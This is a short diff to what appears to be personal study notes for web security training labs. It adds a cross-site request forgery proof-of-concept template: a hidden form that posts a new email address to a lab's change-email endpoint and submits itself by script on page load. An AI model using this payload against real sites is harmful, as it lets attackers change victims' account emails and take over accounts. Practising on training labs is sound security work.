@@ -16,3 +16,14 @@
   </body>
 </html>
 ```
+
+## Miscellaneous Notes
+- Basic CSRF PoC template:
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
